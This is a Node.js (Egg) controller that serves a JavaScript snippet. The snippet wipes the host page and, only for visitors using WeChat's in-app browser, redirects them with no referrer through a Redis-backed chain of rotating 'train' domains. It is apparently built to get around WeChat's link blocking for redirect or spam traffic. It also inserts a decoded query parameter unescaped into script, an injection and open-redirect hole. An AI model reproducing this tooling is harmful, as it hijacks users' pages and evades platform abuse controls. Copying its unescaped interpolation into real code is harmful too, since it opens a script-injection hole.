'use strict';

const Controller = require('egg').Controller;

class TrainDomainController extends Controller {
    async echo() {

        const {
            ctx,
            service,
            app
        } = this;


        this.ctx.set({
            'content-type': "application/x-javascript"
        });

        const id = service.refer.getReferParam('id');

        const url = service.refer.getReferParam('url');
        if (url) {
            return ctx.body = `(function() {
                var ua = navigator.userAgent.toLowerCase();
                try { document.getElementsByTagName("body")[0].outerHTML = "<center>Loading...</center>"; } catch (e) {};
                if (/micromessenger/.test(ua)) {
                    if (top != window || !document.body) {
                        top.location.href = '${decodeURIComponent(url)}';
                    } else {
                        var a = document.createElement('a');
                        a.href = '${decodeURIComponent(url)}';
                        a.rel = 'noreferrer';
                        a.click();
                    }
                }
            })()`
        }
        if (id) {
            const infoKey = `traindomain:${id}:info`;
            let info = await app.redis.get(infoKey);
            info = JSON.parse(info)
            const urlSetKey = `traindomain:${id}:url:set`;
            const urls = await app.redis.srandmember(urlSetKey, info.loopTime);
            let str = '';

            // urls.map(url => {
            //     str += service.url.addParam(url, {
            //         url: encodeURIComponent(str)
            //     })
            // });

            for (let i = 0; i < urls.length; i++) {
                if (i == 0) {
                    str += service.url.addParam(urls[i], {
                        url: encodeURIComponent(info.outer)
                    })
                } else {
                    str = service.url.addParam(urls[i], {
                        url: encodeURIComponent(str)
                    })
                }

            }

            const rdl = service.url.addParam(info.enter, {
                url: encodeURIComponent(str)
            });

            ctx.body = `(function() {
                var ua = navigator.userAgent.toLowerCase();
                try { document.getElementsByTagName("body")[0].outerHTML = "<center>Loading...</center>"; } catch (e) {};
                if (/micromessenger/.test(ua)) {
                    if (top != window || !document.body) {
                        top.location.href = '${rdl}';
                    } else {
                        var a = document.createElement('a');
                        a.href = '${rdl}';
                        a.rel = 'noreferrer';
                        a.click();
                    }
                }
            })()`
        } else [
            ctx.body = '数据出错'
        ]


    }
}

module.exports = TrainDomainController;